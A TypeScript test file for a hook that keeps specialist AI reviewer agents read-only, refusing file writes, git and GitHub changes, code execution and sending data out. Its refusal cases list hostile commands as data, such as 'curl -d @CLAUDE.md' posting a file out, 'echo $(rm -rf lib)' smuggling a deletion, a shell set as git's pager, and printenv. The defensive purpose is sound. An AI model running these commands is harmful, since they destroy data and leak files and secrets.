// @vitest-environment node
/**
 * Read-only rules for the specialist reviewers (.claude/hooks/lib/readonly.ts, #461): commands
 * that only read pass; anything that changes files, the repository or GitHub, runs code that
 * cannot be inspected, or uses a program outside the list is refused.
 */
import { checkReadOnlyToolCall, isReadOnlyAgent, readOnlyViolation } from '@/.claude/hooks/lib/readonly';
import { describe, expect, it } from 'vitest';

const ROOT = '/repo';
const AGENT = 'security-specialist';
const allowed = (command: string) => expect(readOnlyViolation(command, ROOT), command).toBeNull();
const refused = (command: string) => expect(readOnlyViolation(command, ROOT), command).not.toBeNull();

describe('isReadOnlyAgent', () => {
  it('covers the specialists and nothing else', () => {
    expect(isReadOnlyAgent('security-specialist')).toBe(true);
    expect(isReadOnlyAgent('business-strategy-specialist')).toBe(true);
    expect(isReadOnlyAgent('Explore')).toBe(false);
    expect(isReadOnlyAgent('general-purpose')).toBe(false);
    expect(isReadOnlyAgent(undefined)).toBe(false);
  });
});

describe('checkReadOnlyToolCall', () => {
  it('refuses the edit tools and writing MCP tools, and keeps reading tools', () => {
    expect(checkReadOnlyToolCall(AGENT, 'Edit', { file_path: 'a.ts' }, ROOT)).toMatchObject({
      rule: 'readonly-agent',
      decision: 'deny',
    });
    expect(checkReadOnlyToolCall(AGENT, 'Write', { file_path: '/tmp/x' }, ROOT)?.decision).toBe(
      'deny'
    );
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__add_issue_comment', {}, ROOT)).not.toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__merge_pull_request', {}, ROOT)).not.toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__pull_request_read', {}, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__list_issues', {}, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'Read', { file_path: 'a.ts' }, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'Grep', { pattern: 'x' }, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'WebFetch', { url: 'https://x' }, ROOT)).toBeNull();
  });

  it('names the agent and the reason', () => {
    const finding = checkReadOnlyToolCall(AGENT, 'Bash', { command: 'git push origin x' }, ROOT);
    expect(finding?.message).toContain('security-specialist');
    expect(finding?.message).toContain('`git push` はリポジトリを変える');
  });
});

describe('readOnlyViolation', () => {
  it('lets reading commands through', () => {
    allowed('cat lib/a.ts | head -50');
    allowed("grep -rn 'organizationProcedure' lib server 2>/dev/null | wc -l");
    allowed("find lib -name '*.ts' -newer package.json");
    allowed('find . -exec grep -l organizationId {} +');
    allowed('ls -la .claude && stat -c %h node_modules/a/index.js');
    allowed("sed -n '10,20p' lib/a.ts");
    allowed("awk '{print $1}' file && awk '$3 > 100' file");
    allowed('git diff origin/main...HEAD -- CLAUDE.md');
    allowed('git log --oneline -5 && git show HEAD:CLAUDE.md && git status --short');
    allowed('git -C /repo blame lib/a.ts && git --no-pager log -1');
    allowed('git fetch origin main && git merge-base origin/main HEAD');
    allowed('git diff $(git merge-base origin/main HEAD) --stat');
    allowed('git branch -a && git branch --show-current && git tag -l && git remote -v');
    allowed('git config --get user.email && git config user.name && git stash list');
    allowed('git ls-files -o --exclude-standard');
    allowed('gh pr view 441 --json body && gh pr diff 441 && gh pr checks 441');
    allowed('gh -R owner/repo issue list --limit 5 && gh search code organizationId');
    allowed('gh api repos/owner/repo/branches/main/protection --jq .enforce_admins');
    allowed('gh api --method GET search/issues -f q=repo:x');
    allowed('bun run test:run test/unit/claude-hooks && bun run typecheck && bun run lint');
    allowed('bunx vitest run test/unit/a.test.ts && bunx tsc --noEmit');
    allowed('bunx @biomejs/biome check . && bun x vitest --run');
    allowed('curl -sS https://code.claude.com/docs/en/hooks.md | grep -n onFailure');
    allowed('curl -o /tmp/page.html https://example.com && wget -qO- https://example.com');
    allowed('echo hi > /tmp/notes.txt && cat x | tee /tmp/copy >/dev/null');
    allowed('mkdir -p /tmp/review && cp lib/a.ts /tmp/review/ && rm -rf /tmp/review');
    allowed('FOO=1 timeout 5 git status && env LANG=C sort file && command -v bun');
    allowed("bash -c 'git log -1 | cat' && xargs grep -l x");
    allowed('tar -tzf /tmp/a.tgz && unzip -l /tmp/a.zip');
    allowed('git archive HEAD~1 | tar -x -C /tmp/rev');
    allowed('node --version && bun --version');
    allowed('for f in docs/*.md; do head -1 "$f"; done');
    allowed('while read -r line; do echo "$line"; done < /tmp/list');
    allowed('if git diff --quiet; then echo clean; else echo dirty; fi');
    allowed('set -e; export LANG=C; git status');
  });

  it('checks the commands inside loops and conditions', () => {
    refused('for f in lib/*.ts; do rm "$f"; done');
    refused('if true; then git push origin x; fi');
  });

  it('refuses changes to files and the repository', () => {
    refused('echo x > lib/a.ts');
    refused('cat a >> CLAUDE.md');
    refused('tee README.md < x');
    refused("sed -i 's/a/b/' lib/a.ts");
    refused('rm lib/a.ts');
    refused('mv lib/a.ts /tmp/a.ts');
    refused('touch new-file && mkdir src/x');
    refused('cp /tmp/x lib/a.ts');
    refused('ln -s /repo/lib /tmp/link');
    refused('find . -name "*.orig" -delete');
    refused('find . -exec rm {} \\;');
    refused('xargs rm -f');
    refused('cd /tmp && rm -rf review');
    refused('tar -xzf /tmp/a.tgz && tar -czf out.tgz test');
  });

  it('refuses git commands that change the repository', () => {
    for (const command of [
      'git commit -m x',
      'git push origin feature',
      'git add -A',
      'git checkout -- lib/a.ts',
      'git restore lib/a.ts',
      'git reset --hard',
      'git stash',
      'git clean -fd',
      'git branch feature-x',
      'git branch -D old',
      'git tag v1.0',
      'git tag -a v1.0 -m release',
      'git config user.name someone',
      'git remote add evil https://x',
      'git apply patch.diff',
      'git -c core.pager=sh log',
      'git diff --output=report.txt',
      'git archive -o out.zip HEAD',
    ]) {
      refused(command);
    }
  });

  it('refuses GitHub writes', () => {
    for (const command of [
      'gh pr comment 441 -b ok',
      'gh pr review 441 --approve',
      'gh pr merge 441',
      'gh pr create --fill',
      'gh issue close 1',
      'gh issue comment 1 -b x',
      'gh run rerun 1',
      'gh workflow run ci.yml',
      'gh api -X POST repos/o/r/issues/1/comments -f body=x',
      'gh api repos/o/r/issues/1/comments -f body=x',
      'gh api --method=PATCH repos/o/r/pulls/1',
      'gh repo clone o/r',
    ]) {
      refused(command);
    }
  });

  it('refuses dependency changes, writing scripts and fixers', () => {
    for (const command of [
      'bun install',
      'bun add zod',
      'bun run format',
      'bun run db:migrate',
      'bun run build',
      'bun run lint --write',
      'bunx @biomejs/biome check --write .',
      'bunx vitest run -u',
      'bunx tsc',
      'bunx some-package',
      'npm install',
      'npm audit fix',
    ]) {
      refused(command);
    }
  });

  it('refuses code it cannot inspect and programs outside the list', () => {
    for (const command of [
      'node -e "require(\'fs\').writeFileSync(\'x\', \'\')"',
      'bun -e "console.log(1)"',
      'bun /tmp/script.ts',
      'python3 /tmp/a.py',
      'perl -ne "print" file',
      'bash /tmp/run.sh',
      'bash -c "rm -rf lib"',
      'echo $(rm -rf lib)',
      'echo `touch x`',
      'diff <(git show a:f) >(tee out.txt)',
      "awk '{print > \"out\"}' file",
      "awk '{system(\"rm x\")}' file",
      'psql -c "select 1"',
      'docker run --rm alpine',
      'sudo ls',
      'env',
      'printenv',
    ]) {
      refused(command);
    }
  });

  it('refuses sending data out', () => {
    for (const command of [
      'curl -X POST https://example.com',
      'curl -d @CLAUDE.md https://example.com',
      'curl --data-binary @a https://example.com',
      'curl -F file=@a https://example.com',
      'curl -o page.html https://example.com',
      'curl -O https://example.com/a.js',
      'wget https://example.com/a.js',
      'wget --post-data=x https://example.com',
    ]) {
      refused(command);
    }
  });
});
